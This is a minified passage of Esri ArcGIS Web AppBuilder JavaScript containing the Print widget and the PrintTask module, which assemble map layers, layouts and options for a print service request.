// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/Print/Print":function(){define("dojo/_base/declare dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin esri/tasks/PrintTask esri/tasks/PrintParameters esri/tasks/PrintTemplate esri/request esri/lang esri/arcgis/utils dojo/_base/config dojo/_base/lang dojo/_base/array dojo/_base/html dojo/dom-style dojo/dom-construct dojo/dom-class dojo/promise/all dojo/Deferred jimu/portalUrlUtils dojo/text!./templates/Print.html dojo/text!./templates/PrintResult.html dojo/aspect dojo/query jimu/LayerInfos/LayerInfos jimu/dijit/LoadingShelter jimu/dijit/Message jimu/utils dojo/on dijit/popup dijit/form/ValidationTextBox dijit/form/Form dijit/form/Select dijit/form/NumberTextBox dijit/form/Button dijit/form/CheckBox dijit/ProgressBar dijit/form/DropDownButton dijit/TooltipDialog dijit/form/RadioButton dijit/form/SimpleTextarea esri/IdentityManager dojo/store/Memory".split(" "),
function(e,n,t,u,x,r,d,b,h,c,w,l,k,a,F,D,z,y,G,A,B,J,I,q,M,P,g,K,C,H,O){B=e([n,t,u],{widgetsInTemplate:!0,templateString:B,map:null,count:1,results:[],authorText:null,copyrightText:null,defaultTitle:null,defaultFormat:null,defaultLayout:null,baseClass:"gis_PrintDijit",pdfIcon:require.toUrl("./widgets/Print/images/pdf.png"),imageIcon:require.toUrl("./widgets/Print/images/image.png"),printTaskURL:null,printTask:null,async:!1,_showSettings:!1,_currentTemplateInfo:null,postCreate:function(){this.inherited(arguments);
this.printTask=new x(this.printTaskURL,{async:this.async});this.printparams=new r;this.printparams.map=this.map;this.shelter=new P({hidden:!0});this.shelter.placeAt(this.domNode);this.shelter.startup();this.shelter.show();this.titleNode.set("value",this.defaultTitle);this.authorNode.set("value",this.defaultAuthor);this.copyrightNode.set("value",this.defaultCopyright);var g=A.setHttpProtocol(this.printTaskURL),f=A.getNewPrintUrl(this.appConfig.portalUrl);this._isNewPrintUrl=g===f||/sharing\/tools\/newPrint$/.test(g);
g=q("input",this.printWidgetMapScale.domNode)[0];f=q("input",this.printWidgetMapExtent.domNode)[0];K.combineRadioCheckBoxWithLabel(g,this.printWidgetMapScaleLabel);K.combineRadioCheckBoxWithLabel(f,this.printWidgetMapExtentLabel);"MAP_ONLY"===this.defaultLayout?a.setStyle(this.titleTr,"display","none"):a.setStyle(this.titleTr,"display","");this._hasLabelLayer()?(a.setStyle(this.labelsFormDijit.domNode,"display",""),a.setStyle(this.labelsTitleNode,"display","")):(a.setStyle(this.labelsFormDijit.domNode,
"display","none"),a.setStyle(this.labelsTitleNode,"display","none"));M.getInstance(this.map,this.map.itemInfo).then(l.hitch(this,function(f){this.layerInfosObj=f;return y([this._getPrintTaskInfo(),this._getLayerTemplatesInfo()]).then(l.hitch(this,function(f){var v=f[0];(f=f[1])&&!f.error?(f=f&&f.results)&&0<f.length&&(k.some(f,l.hitch(this,function(f){return f&&"Output_JSON"===f.paramName?this.templateInfos=f.value:!1})),this.templateInfos&&0<this.templateInfos.length&&(this.templateNames=k.map(this.templateInfos,
function(f){return f.layoutTemplate}))):console.warn("Get Layout Templates Info Error",f&&f.error);!h.isDefined(v)||v&&v.error?this._handleError(v.error):this._handlePrintInfo(v)}))})).always(l.hitch(this,function(){this.shelter.hide()}));this.printTask._getPrintDefinition&&I.after(this.printTask,"_getPrintDefinition",l.hitch(this,"printDefInspector"),!1);this.printTask._createOperationalLayers&&(I.after(this.printTask,"_createOperationalLayers",l.hitch(this,"_fixInvalidSymbol")),I.after(this.printTask,
"_createOperationalLayers",l.hitch(this,"_excludeInvalidLegend")))},_hasLabelLayer:function(){return k.some(this.map.graphicsLayerIds,function(a){return(a=this.map.getLayer(a))&&"esri.layers.LabelLayer"===a.declaredClass},this)},_getPrintTaskInfo:function(){var a=new G;this._isNewPrintUrl?a.resolve({isGPPrint:!1}):b({url:this.printTaskURL,content:{f:"json"},callbackParamName:"callback",handleAs:"json",timeout:6E4}).then(l.hitch(this,function(f){a.resolve({isGPPrint:!0,data:f})}),l.hitch(this,function(f){a.resolve({error:f})}));
return a},_getLayerTemplatesInfo:function(){var a=new G,f=this.printTaskURL.split("/"),m=f.indexOf("GPServer");if(-1<m){var v=null,v=/Utilities\/PrintingTools\/GPServer/.test(this.printTaskURL)?f.slice(0,m+1).join("/")+"/"+encodeURIComponent("Get Layout Templates Info Task")+"/execute":f.slice(0,m+1).join("/")+"/"+encodeURIComponent("Get Layout Templates Info")+"/execute";b({url:v,content:{f:"json"},callbackParamName:"callback",handleAs:"json",timeout:6E4}).then(l.hitch(this,function(f){a.resolve(f)}),
l.hitch(this,function(f){a.resolve({error:f})}))}else a.resolve(null);return a},_fixInvalidSymbol:function(a){k.forEach(a,function(f){"map_graphics"===f.id&&(f=l.getObject("featureCollection.layers",!1,f))&&0<f.length&&k.forEach(f,function(f){f&&f.featureSet&&"esriGeometryPoint"===f.featureSet.geometryType&&k.forEach(f.featureSet.features,function(f){f&&f.symbol&&!f.symbol.style&&(f.symbol.style="esriSMSSquare")})})},this);return a},_excludeInvalidLegend:function(a){function f(f){return k.filter(f.subLayerIds,
l.hitch(this,function(v){return(v=this.layerInfosObj.getLayerInfoById(f.id+"_"+v))&&v.getShowLegendOfWebmap()}))}if(this.printTask.allLayerslegend){for(var m=c.getLegendLayers({map:this.map,itemInfo:this.map.itemInfo}),m=k.map(m,function(f){return{id:f.layer.id}}),v=this.printTask.allLayerslegend,q=[],g=0;g<v.length;g++){var h=v[g],C=this.map.getLayer(h.id),b=this.layerInfosObj.getLayerInfoById(h.id),K=C&&C.declaredClass&&"esri.layers.GraphicsLayer"!==C.declaredClass,C=!C.renderer||C.renderer&&!C.renderer.hasVisualVariables(),
b=b&&b.getShowLegendOfWebmap();K&&C&&b&&(h.subLayerIds&&(h.subLayerIds=l.hitch(this,f,h)()),q.push(h))}k.forEach(m,l.hitch(this,function(f){var v=k.some(q,l.hitch(this,function(v){return v.id===f.id})),m=this.layerInfosObj.getLayerInfoById(f.id),m=m&&m.getShowLegendOfWebmap()&&m.isShowInMap();!v&&m&&q.push(f)}));this.printTask.allLayerslegend=q}return a},printDefInspector:function(a){"force"===this.preserve.preserveScale&&(a.mapOptions.scale=this.preserve.forcedScale);return a},_handleError:function(a){console.log("print widget load error: ",
a);new g({message:a.message||a})},onLayoutChange:function(q){var f=this.templateNames&&this.templateNames.indexOf(q);if(-1<f){a.empty(this.customTextElementsTable);q=this._currentTemplateInfo=this.templateInfos[f];if((f=l.getObject("layoutOptions.customTextElements",!1,q))&&0<f.length){var m=[];k.forEach(f,l.hitch(this,function(f){for(var v in f)if(0>m.indexOf(v)){var q=this.customTextElementsTable.insertRow(-1);q.insertCell(-1).appendChild(a.toDom(v+": "));q.insertCell(-1).appendChild((new O({name:v,
trim:!0,required:!1,value:f[v],style:"width:100%"})).domNode);m.push(v)}}))}l.getObject("layoutOptions.hasAuthorText",!1,q)?a.setStyle(this.authorTr,"display",""):a.setStyle(this.authorTr,"display","none");l.getObject("layoutOptions.hasCopyrightText",!1,q)?a.setStyle(this.copyrightTr,"display",""):a.setStyle(this.copyrightTr,"display","none");l.getObject("layoutOptions.hasTitleText",!1,q)?a.setStyle(this.titleTr,"display",""):a.setStyle(this.titleTr,"display","none");l.getObject("layoutOptions.hasLegend",
!1,q)?a.setStyle(this.legendTr,"display",""):a.setStyle(this.legendTr,"display","none")}else"MAP_ONLY"===q?(a.setStyle(this.authorTr,"display","none"),a.setStyle(this.copyrightTr,"display","none"),a.setStyle(this.titleTr,"display","none"),a.setStyle(this.legendTr,"display","none"),this._currentTemplateInfo={layoutOptions:{hasTitleText:!1,hasCopyrightText:!1,hasAuthorText:!1,hasLegend:!1}}):(a.setStyle(this.authorTr,"display",""),a.setStyle(this.copyrightTr,"display",""),a.setStyle(this.titleTr,"display",
""),a.setStyle(this.legendTr,"display",""),this._currentTemplateInfo={layoutOptions:{hasTitleText:!0,hasCopyrightText:!0,hasAuthorText:!0,hasLegend:!0}})},_getMapAttribution:function(){var q=this.map.attribution;return q&&q.domNode?a.getProp(q.domNode,"textContent"):""},showSettings:function(a){a.preventDefault();a.stopPropagation();this._showSettings?(H.close(this.settingsDialog),this._showSettings=!1):(H.open({popup:this.settingsDialog,around:this.advancedButtonDijit}),this._showSettings=!0)},_handlePrintInfo:function(q){if(q.isGPPrint){q=
q.data;F.set(this.layoutDijit.domNode.parentNode.parentNode,"display","");F.set(this.formatDijit.domNode.parentNode.parentNode,"display","");F.set(this.advancedButtonDijit,"display","");this.own(C(document.body,"click",l.hitch(this,function(f){if(this._showSettings){f=f.target||f.srcElement;var v=this.settingsDialog.domNode;f===v||a.isDescendant(f,v)||(H.close(this.settingsDialog),this._showSettings=!1)}})));var f=k.filter(q.parameters,function(f){return"Layout_Template"===f.name});if(0===f.length)console.log('print service parameters name for templates must be "Layout_Template"');
else{var m=k.map(f[0].choiceList,function(f){return{label:f,value:f}});m.sort(function(f,m){return f.label>m.label?1:m.label>f.label?-1:0});this.layoutDijit.addOption(m);this.defaultLayout?this.layoutDijit.set("value",this.defaultLayout):this.layoutDijit.set("value",f[0].defaultValue);q=k.filter(q.parameters,function(f){return"Format"===f.name});0===q.length?console.log('print service parameters name for format must be "Format"'):(f=k.map(q[0].choiceList,function(f){return{label:f,value:f}}),f.sort(function(f,
m){return f.label>m.label?1:m.label>f.label?-1:0}),this.formatDijit.addOption(f),this.defaultFormat?this.formatDijit.set("value",this.defaultFormat):this.formatDijit.set("value",q[0].defaultValue))}}else F.set(this.layoutDijit.domNode.parentNode.parentNode,"display","none"),F.set(this.formatDijit.domNode.parentNode.parentNode,"display","none"),F.set(this.advancedButtonDijit,"display","none")},print:function(){if(this.printSettingsFormDijit.isValid()){var a=this.printSettingsFormDijit.get("value");
l.mixin(a,this.layoutMetadataDijit.get("value"));l.mixin(a,this.labelsFormDijit.get("value"));this.preserve=this.preserveFormDijit.get("value");l.mixin(a,this.preserve);this.layoutForm=this.layoutFormDijit.get("value");var f=this.mapQualityFormDijit.get("value"),m=this.mapOnlyFormDijit.get("value");l.mixin(m,f);var v=this.customTextElementsDijit.get("value"),f=[],q=!1,g=w.locale||"en",c;for(c in v){var h={};"Date"===c?(h[c]=(new Date).toLocaleString(g),q=!0):h[c]=v[c];f.push(h)}q||f.push({Date:(new Date).toLocaleString(g)});
q=this._currentTemplateInfo;c=l.getObject("layoutOptions.hasAuthorText",!1,q);v=l.getObject("layoutOptions.hasCopyrightText",!1,q);q=l.getObject("layoutOptions.hasTitleText",!1,q);g=new d;g.format=a.format;g.layout=a.layout;g.preserveScale="true"===a.preserveScale||"force"===a.preserveScale;g.label=a.title;g.exportOptions=m;g.showLabels=a.showLabels&&a.showLabels[0];g.layoutOptions={authorText:c?a.author:"",copyrightText:v?a.copyright||this._getMapAttribution():"",legendLayers:this._getLegendLayers(),
titleText:q?a.title:"",customTextElements:f};this.printparams.template=g;this.printparams.extraParameters={printFlag:!0};m=this.printTask.execute(this.printparams);(new Q({count:this.count.toString(),icon:"PDF"===a.format?this.pdfIcon:this.imageIcon,docName:a.title,title:a.format+", "+a.layout,fileHandle:m,nls:this.nls})).placeAt(this.printResultsNode,"last").startup();F.set(this.clearActionBarNode,"display","block");this.count++}else this.printSettingsFormDijit.validate()},_getLegendLayers:function(){var a=
l.getObject("layoutOptions.hasLegend",!1,this._currentTemplateInfo),f=0<this.layoutForm.legend.length&&this.layoutForm.legend[0];if(this.printTask&&!this.printTask._createOperationalLayers){var m=[];a&&f&&(a=c.getLegendLayers({map:this.map,itemInfo:this.map.itemInfo}),m=k.map(a,function(f){return{layerId:f.layer.id}}));return m}return a&&f?null:[]},clearResults:function(){D.empty(this.printResultsNode);F.set(this.clearActionBarNode,"display","none");this.count=1},updateAuthor:function(a){(a=a||"")&&
this.authorTB&&this.authorTB.set("value",a)},getCurrentMapScale:function(){this.forceScaleNTB.set("value",this.map.getScale())}});var Q=e([n,t,u],{widgetsInTemplate:!0,templateString:J,url:null,postCreate:function(){this.inherited(arguments);this.progressBar.set("label",this.nls.creatingPrint);this.fileHandle.then(l.hitch(this,"_onPrintComplete"),l.hitch(this,"_onPrintError"))},_onPrintComplete:function(q){q.url?(this.url=q.url,a.setStyle(this.progressBar.domNode,"display","none"),a.setStyle(this.successNode,
"display","inline-block"),z.add(this.resultNode,"printResultHover")):this._onPrintError(this.nls.printError)},_onPrintError:function(q){console.log(q);a.setStyle(this.progressBar.domNode,"display","none");a.setStyle(this.errNode,"display","block");z.add(this.resultNode,"printResultError");a.setAttr(this.domNode,"title",q.details||q.message||"")},_openPrint:function(){null!==this.url&&window.open(this.url)}});return B})},"esri/tasks/PrintTask":function(){define("dojo/_base/declare dojo/_base/lang dojo/_base/array dojo/_base/json dojo/_base/Deferred dojo/has ../kernel ../lang ../layerUtils ../deferredUtils ../Color ../urlUtils ./Task ../geometry/Polygon ../renderers/SimpleRenderer ../symbols/FillSymbol ./Geoprocessor ./PrintTemplate dojo/dom-attr dojo/dom-construct dojox/gfx/_base dojox/gfx/canvas dojox/json/query dojo/has!extend-esri?./PrintParameters dojo/has!extend-esri?./LegendLayer".split(" "),
function(e,n,t,u,x,r,d,b,h,c,w,l,k,a,F,D,z,y,G,A,B,J,I){e=e(k,{declaredClass:"esri.tasks.PrintTask",constructor:function(a,c){this.url=a;this.printGp=new z(this.url);this._handler=n.hitch(this,this._handler);c&&c.async&&(this.async=c.async);this._colorEvaluator=I("$..color")},_vtlExtent:null,_handler:function(a,c,h,g,l){try{var q;this.async?"esriJobSucceeded"===a.jobStatus&&this.printGp.getResultData(a.jobId,"Output_File",n.hitch(this,function(a){q=a.value;this._successHandler([q],"onComplete",h,
l)})):(q=a[0].value,this._successHandler([q],"onComplete",h,l))}catch(H){this._errorHandler(H,g,l)}},execute:function(a,h,l){var q=this._handler,K=this._errorHandler,C=a.template||new y;C.hasOwnProperty("showLabels")||(C.showLabels=!0);var d=C.exportOptions,r;d&&(r={outputSize:[d.width,d.height],dpi:d.dpi});var d=C.layoutOptions,e,k=[];if(d){this.legendAll=!1;d.legendLayers?t.forEach(d.legendLayers,function(f){var m={};m.id=f.layerId;f.subLayerIds&&(m.subLayerIds=f.subLayerIds);k.push(m)}):this.legendAll=
!0;var f,m;if("Miles"===d.scalebarUnit||"Kilometers"===d.scalebarUnit)f="esriKilometers",m="esriMiles";else if("Meters"===d.scalebarUnit||"Feet"===d.scalebarUnit)f="esriMeters",m="esriFeet";e={esriMiles:"mi",esriKilometers:"km",esriFeet:"ft",esriMeters:"m"};e={titleText:d.titleText,authorText:d.authorText,copyrightText:d.copyrightText,customTextElements:d.customTextElements,scaleBarOptions:{metricUnit:f,metricLabel:e[f],nonMetricUnit:m,nonMetricLabel:e[m]},legendOptions:{operationalLayers:k}}}f=this._getPrintDefinition(a.map,
C);a.outSpatialReference&&(f.mapOptions.spatialReference=a.outSpatialReference.toJson());a.template&&b.isDefined(a.template.showAttribution)&&(f.mapOptions.showAttribution=a.template.showAttribution);n.mixin(f,{exportOptions:r,layoutOptions:e});this.allLayerslegend&&n.mixin(f.layoutOptions,{legendOptions:{operationalLayers:this.allLayerslegend}});if(f.operationalLayers){r=f.operationalLayers;var v,E=function(f){return b.fixJson(n.mixin(f,{type:"esriSLS",cap:void 0,join:void 0,meterLimit:void 0}))},
N=/[\u4E00-\u9FFF\u0E00-\u0E7F\u0900-\u097F]/,F=/[\u0600-\u06FF]/,M=function(f){var m=f.text,a=(f=f.font)&&f.family&&f.family.toLowerCase();m&&f&&("arial"===a||"arial unicode ms"===a)&&(f.family=N.test(m)?"Arial Unicode MS":"Arial","normal"!==f.style&&F.test(m)&&(f.family="Arial Unicode MS"))};for(e=0;e<r.length;e++)if(r[e].featureCollection&&r[e].featureCollection.layers)for(m=0;m<r[e].featureCollection.layers.length;m++){var w=r[e].featureCollection.layers[m];w.layerDefinition&&w.layerDefinition.drawingInfo&&
w.layerDefinition.drawingInfo.renderer&&w.layerDefinition.drawingInfo.renderer.symbol&&(v=w.layerDefinition.drawingInfo.renderer,"esriCLS"===v.symbol.type?v.symbol=E(v.symbol):"esriTS"===v.symbol.type?M(v.symbol):v.symbol.outline&&"esriCLS"===v.symbol.outline.type&&(v.symbol.outline=E(v.symbol.outline)));if(w.featureSet&&w.featureSet.features)for(d=0;d<w.featureSet.features.length;d++)v=w.featureSet.features[d],v.symbol&&("esriCLS"===v.symbol.type?v.symbol=E(v.symbol):"esriTS"===v.symbol.type?M(v.symbol):
v.symbol.outline&&"esriCLS"===v.symbol.outline.type&&(v.symbol.outline=E(v.symbol.outline)))}}C={Web_Map_as_JSON:u.toJson(b.fixJson(f)),Format:C.format,Layout_Template:C.layout};a.extraParameters&&(C=n.mixin(C,a.extraParameters));var D=new x(c._dfdCanceller);a=function(f,m){q(f,m,h,l,D)};f=function(f){K(f,l,D)};D._pendingDfd=this.async?this.printGp.submitJob(C,a,null,f):this.printGp.execute(C,a,f);return D},onComplete:function(){},_createMultipointLayer:function(){return{layerDefinition:{name:"multipointLayer",
geometryType:"esriGeometryMultipoint",drawingInfo:{renderer:null}},featureSet:{geometryType:"esriGeometryMultipoint",features:[]}}},_createPolygonLayer:function(){return{layerDefinition:{name:"polygonLayer",geometryType:"esriGeometryPolygon",drawingInfo:{renderer:null}},featureSet:{geometryType:"esriGeometryPolygon",features:[]}}},_createPointLayer:function(){return{layerDefinition:{name:"pointLayer",geometryType:"esriGeometryPoint",drawingInfo:{renderer:null}},featureSet:{geometryType:"esriGeometryPoint",
features:[]}}},_createPolylineLayer:function(){return{layerDefinition:{name:"polylineLayer",geometryType:"esriGeometryPolyline",drawingInfo:{renderer:null}},featureSet:{geometryType:"esriGeometryPolyline",features:[]}}},_convertSvgSymbol:function(a){if(!(8>=r("ie")||!a.path&&"image/svg+xml"!==a.contentType)){var q,c=J.createSurface(A.create("div"),1024,1024);q="image/svg+xml"===a.contentType?c.createObject(J.Image,{src:"data:image/svg+xml;base64,"+a.imageData,width:B.pt2px(a.width),height:B.pt2px(a.height),
x:0,y:0}):c.createObject(J.Path,a.path).setFill(a.color).setStroke(a.outline);"pendingRender"in c&&c._render(!0);var g=c.rawNode.getContext("2d"),h=Math.ceil(q.getBoundingBox().width),l=Math.ceil(q.getBoundingBox().height);q=g.getImageData(q.getBoundingBox().x,q.getBoundingBox().y,h,l);g.canvas.width=h;g.canvas.height=l;g.putImageData(q,0,0);g=g.canvas.toDataURL("image/png");a={type:"esriPMS",imageData:g.substr(22,g.length),angle:a.angle,contentType:"image/png",height:a.size?a.size:B.px2pt(l),width:a.size?
h/l*a.size:B.px2pt(h),xoffset:a.xoffset,yoffset:a.yoffset};c.destroy();return a}},_convertSvgRenderer:function(a){"simple"===a.type&&a.symbol&&(a.symbol.path||"image/svg+xml"===a.symbol.contentType)?a.symbol=this._convertSvgSymbol(a.symbol):"uniqueValue"===a.type?(a.defaultSymbol&&(a.defaultSymbol.path||"image/svg+xml"===a.defaultSymbol.contentType)&&(a.defaultSymbol=this._convertSvgSymbol(a.defaultSymbol)),a.uniqueValueInfos&&t.forEach(a.uniqueValueInfos,function(a){if(a.symbol.path||"image/svg+xml"===
a.symbol.contentType)a.symbol=this._convertSvgSymbol(a.symbol)},this)):"classBreaks"===a.type&&(a.defaultSymbol&&(a.defaultSymbol.path||"image/svg+xml"===a.defaultSymbol.contentType)&&(a.defaultSymbol=this._convertSvgSymbol(a.defaultSymbol)),a.classBreakInfos&&t.forEach(a.classBreakInfos,function(a){if(a.symbol.path||"image/svg+xml"===a.symbol.contentType)a.symbol=this._convertSvgSymbol(a.symbol)},this))},_createFeatureCollection:function(q,c,h){var g=this._createPolygonLayer(),l=this._createPolylineLayer(),
d=this._createPointLayer(),b=this._createMultipointLayer(),e=this._createPointLayer();e.layerDefinition.name="textLayer";delete e.layerDefinition.drawingInfo;if("esri.layers.FeatureLayer"===q.declaredClass||"esri.layers.StreamLayer"===q.declaredClass)g.layerDefinition.name=l.layerDefinition.name=d.layerDefinition.name=b.layerDefinition.name=n.getObject("arcgisProps.title",!1,q)||q.name||q.id;var r=q.renderer&&"esri.renderer.SimpleRenderer"===q.renderer.declaredClass;if(!q.renderer||q.renderer.valueExpression||
n.isFunction(q.renderer.attributeField))delete g.layerDefinition.drawingInfo,delete l.layerDefinition.drawingInfo,delete d.layerDefinition.drawingInfo,delete b.layerDefinition.drawingInfo;else{var k=q.renderer.toJson({useLegacyRotationProperties:!0});if("temporal"===k.type){var k={latestObservationRenderer:k.latestObservationRenderer,trackLinesRenderer:k.trackRenderer,observationAger:k.observationAger,renderer:k.observationRenderer},f={};q._trackIdField&&(f.trackIdField=q._trackIdField);q._startTimeField&&
(f.startTimeField=q._startTimeField);q._endTimeField&&(f.endTimeField=q._endTimeField);g.layerDefinition.drawingInfo=k;g.layerDefinition.timeInfo=f;l.layerDefinition.drawingInfo=k;l.layerDefinition.timeInfo=f;d.layerDefinition.drawingInfo=k;d.layerDefinition.timeInfo=f;b.layerDefinition.drawingInfo=k;b.layerDefinition.timeInfo=f}else g.layerDefinition.drawingInfo.renderer=k,l.layerDefinition.drawingInfo.renderer=k,d.layerDefinition.drawingInfo.renderer=k,b.layerDefinition.drawingInfo.renderer=k}k=
q.fields;k||!q.renderer||q.renderer.valueExpression||n.isFunction(q.renderer.attributeField)||("esri.renderer.ClassBreaksRenderer"===q.renderer.declaredClass?(k=[{name:q.renderer.attributeField,type:"esriFieldTypeDouble"}],q.renderer.normalizationField&&k.push({name:q.renderer.normalizationField,type:"esriFieldTypeDouble"})):"esri.renderer.UniqueValueRenderer"===q.renderer.declaredClass&&(k=[{name:q.renderer.attributeField,type:"esriFieldTypeString"}],q.renderer.attributeField2&&k.push({name:q.renderer.attributeField2,
type:"esriFieldTypeString"}),q.renderer.attributeField3&&k.push({name:q.renderer.attributeField3,type:"esriFieldTypeString"})));k&&(g.layerDefinition.fields=k,l.layerDefinition.fields=k,d.layerDefinition.fields=k,b.layerDefinition.fields=k);k=q.graphics;q.isFeatureReductionActive&&q.isFeatureReductionActive()&&(k=q.getSingleGraphics());var f=k.length,m,v;for(v=0;v<f;v++){var E=k[v];if(!1!==E.visible&&E.geometry){m=E.toJson();m.symbol&&m.symbol.outline&&m.symbol.outline.color&&m.symbol.outline.color[3]&&
(m.symbol.outline.color[3]=255);if(q.renderer&&!m.symbol&&(n.isFunction(q.renderer.attributeField)||q.renderer.valueExpression||this._isFeatureCollectionRequired(q.renderer,q)||"esri.renderer.DotDensityRenderer"===q.renderer.declaredClass||h)){h=h||q.renderer;var N=null;try{N=h.getSymbol(E)}catch(R){}if(!N)continue;m.symbol=N.toJson();this._isFeatureCollectionRequired(h,q)&&this._applyVisualVariables(m.symbol,{renderer:h,graphic:E,symbol:N,mapResolution:c&&c.getResolutionInMeters(),mapScale:c&&c.getScale()})}m.symbol&&
(m.symbol.path||"image/svg+xml"===m.symbol.contentType?m.symbol=this._convertSvgSymbol(m.symbol):m.symbol.text&&delete m.attributes);switch(E.geometry.type){case "polygon":g.featureSet.features.push(m);break;case "polyline":l.featureSet.features.push(m);break;case "point":m.symbol&&m.symbol.text?e.featureSet.features.push(m):d.featureSet.features.push(m);break;case "multipoint":b.featureSet.features.push(m);break;case "extent":m.geometry=a.fromExtent(E.geometry).toJson(),g.featureSet.features.push(m)}}}c=
[];0<g.featureSet.features.length&&c.push(g);0<l.featureSet.features.length&&c.push(l);0<b.featureSet.features.length&&c.push(b);0<d.featureSet.features.length&&c.push(d);0<e.featureSet.features.length&&c.push(e);if(!c.length)return null;t.forEach(c,function(f){var a=t.every(f.featureSet.features,function(f){return f.symbol});if(r||a)t.forEach(f.featureSet.features,function(f){delete f.attributes}),delete f.layerDefinition.fields;a&&delete f.layerDefinition.drawingInfo});t.forEach(c,function(f){f.layerDefinition.drawingInfo&&
f.layerDefinition.drawingInfo.renderer&&this._convertSvgRenderer(f.layerDefinition.drawingInfo.renderer)},this);return{id:q.id,opacity:q.opacity,minScale:q.minScale||0,maxScale:q.maxScale||0,featureCollection:{layers:c}}},_getPrintDefinition:function(a,c){var q={operationalLayers:this._createOperationalLayers(a,c)},g=this._vtlExtent||a.extent,h=a.spatialReference;this._vtlExtent=null;a.spatialReference._isWrappable()&&(g=g._normalize(!0),h=g.spatialReference);g={mapOptions:{showAttribution:a.showAttribution,
extent:g.toJson(),spatialReference:h.toJson()}};c.preserveScale&&n.mixin(g.mapOptions,{scale:c.outScale||a.getScale()});a.timeExtent&&n.mixin(g.mapOptions,{time:[a.timeExtent.startTime.getTime(),a.timeExtent.endTime.getTime()]});a={};n.mixin(a,g,q);return a},_createOperationalLayers:function(a,c){var q,g,d,b,k=[],e=0;c.preserveScale&&(e=c.outScale||a.getScale());this.allLayerslegend=this.legendAll?[]:null;this._vtlExtent=null;var r=t.map(a.layerIds,a.getLayer,a);a._mapImageLyr&&r.push(a._mapImageLyr);
for(q=0;q<r.length;q++)if(g=r[q],g.loaded&&g.visible&&(!e||g.isVisibleAtScale(e)))switch(d=g.declaredClass,b={id:g.id,title:n.getObject("arcgisProps.title",!1,g)||g.id,opacity:g.opacity,minScale:g.minScale||0,maxScale:g.maxScale||0},b=n.mixin(b,this._getUrlAndToken(g)),g.getNode()&&G.get(g.getNode(),"data-reference")&&(b._isRefLayer=!0),d){case "esri.layers.ArcGISDynamicMapServiceLayer":var w=[];d=!!g._params.layers;if(g._params.dynamicLayers)d=u.fromJson(g._params.dynamicLayers),t.forEach(d,function(f){w.push({id:f.id,
name:f.name,layerDefinition:f});delete f.id;delete f.name;delete f.maxScale;delete f.minScale}),0===w.length&&(b.visibleLayers=[-1]);else if(g.supportsDynamicLayers){if(d||g.layerDefinitions||g.layerTimeOptions){var f=g.createDynamicLayerInfosFromLayerInfos(),m=null;d&&(m=g.visibleLayers);var m=h._getVisibleLayers(f,m),v=h._getLayersForScale(c.outScale||a.getScale(),f);t.forEach(f,function(f){if(!f.subLayerIds){var a=f.id;-1<t.indexOf(m,a)&&-1<t.indexOf(v,a)&&(f={source:f.source.toJson()},g.layerDefinitions&&
g.layerDefinitions[a]&&(f.definitionExpression=g.layerDefinitions[a]),g.layerTimeOptions&&g.layerTimeOptions[a]&&(f.layerTimeOptions=g.layerTimeOptions[a].toJson()),w.push({id:a,layerDefinition:f}))}});0===w.length&&(b.visibleLayers=[-1])}}else t.forEach(g.layerInfos,function(f){var a={id:f.id,layerDefinition:{}};g.layerDefinitions&&g.layerDefinitions[f.id]&&(a.layerDefinition.definitionExpression=g.layerDefinitions[f.id]);g.layerTimeOptions&&g.layerTimeOptions[f.id]&&(a.layerDefinition.layerTimeOptions=
g.layerTimeOptions[f.id].toJson());(a.layerDefinition.definitionExpression||a.layerDefinition.layerTimeOptions)&&w.push(a)}),d&&(b.visibleLayers=g.visibleLayers);w.length&&(b.layers=w);k.push(b);this.allLayerslegend&&this.allLayerslegend.push({id:g.id,subLayerIds:g.visibleLayers});break;case "esri.layers.ArcGISImageServiceLayer":b=n.mixin(b,{url:g.url,bandIds:g.bandIds,compressionQuality:g.compressionQuality,format:g.format,interpolation:g.interpolation});g.mosaicRule&&n.mixin(b,{mosaicRule:g.mosaicRule.toJson()});
(g.renderingRule||g.renderer)&&(d=g.getExportImageRenderingRule())&&n.mixin(b,{renderingRule:d.toJson()});k.push(b);this.allLayerslegend&&this.allLayerslegend.push({id:g.id});break;case "esri.layers.WMSLayer":b=n.mixin(b,{url:g.url,title:g.title,type:"wms",version:g.version,transparentBackground:g.imageTransparency,visibleLayers:g.visibleLayers});k.push(b);this.allLayerslegend&&this.allLayerslegend.push({id:g.id,subLayerIds:g.visibleLayers});break;case "esri.virtualearth.VETiledLayer":d=g.mapStyle;
"roadOnDemand"===d?d="Road":"aerialWithLabelsOnDemand"===d&&(d="Hybrid");b=n.mixin(b,{visibility:g.visible,type:"BingMaps"+d,culture:g.culture,key:g.bingMapsKey});k.push(b);break;case "esri.layers.OpenStreetMapLayer":b=n.mixin(b,{credits:g.copyright,type:"OpenStreetMap",url:l.getAbsoluteUrl(g.tileServers[0])});k.push(b);break;case "esri.layers.WMTSLayer":b=n.mixin(b,{url:g.url,type:"wmts",layer:g._identifier,style:g._style,format:g.format,tileMatrixSet:g._tileMatrixSetId});k.push(b);break;case "esri.layers.MapImageLayer":d=
g.getImages();t.forEach(d,function(f,a){f.visible&&f.href&&(b={id:g.id+"_image"+a,type:"image",title:g.id,minScale:g.minScale||0,maxScale:g.maxScale||0,opacity:g.opacity*f.opacity,extent:f.extent.toJson()},"data:image/png;base64,"===f.href.substr(0,22)?b.imageData=f.href.substr(22):b.url=f.href,k.push(b))});break;case "esri.layers.VectorTileLayer":b.type="image";b.url&&delete b.url;d=this._vtlExtent||a.extent.offset(0,0);var E=c.exportOptions&&c.exportOptions.dpi||96,f={format:"png",pixelRatio:E/
96};"MAP_ONLY"!==c.layout||!c.preserveScale||c.outScale&&c.outScale!==a.getScale()||96!==E||!c.exportOptions||c.exportOptions.width%2===a.width%2&&c.exportOptions.height%2===a.height%2||(f.area={x:0,y:0,width:a.width,height:a.height},c.exportOptions.width%2!==a.width%2&&--f.area.width,c.exportOptions.height%2!==a.height%2&&--f.area.height,this._vtlExtent||(E=a.toMap({x:f.area.width,y:f.area.height}),d.update(d.xmin,E.y,E.x,d.ymax,d.spatialReference),this._vtlExtent=d));b.extent=d._normalize(!0).toJson();
